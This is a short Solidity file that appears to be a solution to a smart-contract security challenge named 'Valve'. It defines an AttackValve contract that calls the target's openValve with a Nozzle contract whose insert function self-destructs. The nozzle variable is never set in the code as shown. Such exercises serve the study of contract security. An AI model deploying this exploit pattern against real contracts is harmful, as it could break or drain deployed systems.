//SPDX-License-Identifier: MIT


pragma solidity ^0.8.0;


import "./Valve.sol";


contract AttackValve{

    Valve valve;
    Nozzle nozzle;


    constructor(address _valve){
        valve = Valve(_valve);
    }



    function attack()public{
        valve.openValve(nozzle);
    }
}



contract Nozzle is INozzle{

    function insert()external override returns(bool){
        selfdestruct(payable(address(this)));
    }
}